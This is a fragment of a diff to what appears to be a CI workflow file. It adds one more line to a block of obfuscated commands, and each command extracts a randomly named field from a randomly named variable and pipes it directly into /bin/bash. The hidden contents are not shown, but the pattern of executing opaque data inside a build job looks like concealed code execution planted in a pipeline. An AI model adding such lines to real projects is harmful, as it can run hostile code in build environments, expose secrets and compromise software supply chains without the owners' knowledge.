@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$ah1853" | jq -r .vmi59 | /bin/bash
           echo $v71442 | jq -r .vt28482 | /bin/bash
           echo $n11 | jq -r .wiyt919 | /bin/bash
+          echo $gz14 | jq -r .nyxf090 | /bin/bash
 
       - name: Store artifact
         if: always()
